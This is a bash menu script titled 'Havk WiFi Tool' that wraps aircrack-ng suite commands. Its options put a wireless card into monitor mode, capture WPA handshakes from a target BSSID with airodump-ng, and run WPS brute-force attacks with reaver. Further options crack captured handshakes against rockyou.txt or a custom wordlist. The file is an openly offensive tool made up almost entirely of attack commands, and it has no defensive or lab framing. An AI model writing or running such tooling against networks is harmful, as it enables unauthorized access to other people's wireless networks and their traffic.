#!/bin/bash

# Function to start monitor mode
start_monitor_mode() {
    echo "Starting monitor mode..."
    airmon-ng start wlan0
}

# Function to stop monitor mode
stop_monitor_mode() {
    echo "Stopping monitor mode..."
    airmon-ng stop wlan0mon
}

# Function to get handshake
get_handshake() {
    echo "Getting handshake..."
    airodump-ng wlan0mon --bssid <TARGET_BSSID> -c <TARGET_CHANNEL> -w capture
}

# Function to install wireless tools
install_wireless_tools() {
    echo "Installing wireless tools..."
    pkg update
    pkg install -y aircrack-ng
}

# Function to perform WPS attacks
wps_attack() {
    echo "Performing WPS attack..."
    reaver -i wlan0mon -b <TARGET_BSSID> -vv
}

# Function to scan for WPS networks
scan_wps_networks() {
    echo "Scanning for WPS networks..."
    wash -i wlan0mon
}

# Function to crack handshake with rockyou.txt
crack_handshake_rockyou() {
    echo "Cracking handshake with rockyou.txt..."
    aircrack-ng -w /path/to/rockyou.txt -b <TARGET_BSSID> capture-01.cap
}

# Function to crack handshake with custom wordlist
crack_handshake_wordlist() {
    echo "Cracking handshake with custom wordlist..."
    aircrack-ng -w /path/to/wordlist.txt -b <TARGET_BSSID> capture-01.cap
}

# Function to crack handshake without wordlist
crack_handshake_no_wordlist() {
    echo "Cracking handshake without wordlist..."
    aircrack-ng -b <TARGET_BSSID> capture-01.cap
}

# Main menu
while true; do
    echo "Havk WiFi Tool"
    echo "1. Start monitor mode"
    echo "2. Stop monitor mode"
    echo "3. Get handshake"
    echo "4. Install wireless tools"
    echo "5. WPS network attacks"
    echo "6. Scan for WPS networks"
    echo "7. Crack handshake with rockyou.txt"
    echo "8. Crack handshake with wordlist"
    echo "9. Crack handshake without wordlist"
    echo "10. Exit"
    read -p "Select an option: " choice

    case $choice in
        1) start_monitor_mode ;;
        2) stop_monitor_mode ;;
        3) get_handshake ;;
        4) install_wireless_tools ;;
        5) wps_attack ;;
        6) scan_wps_networks ;;
        7) crack_handshake_rockyou ;;
        8) crack_handshake_wordlist ;;
        9) crack_handshake_no_wordlist ;;
        10) exit 0 ;;
        *) echo "Invalid option. Please try again." ;;
    esac
done
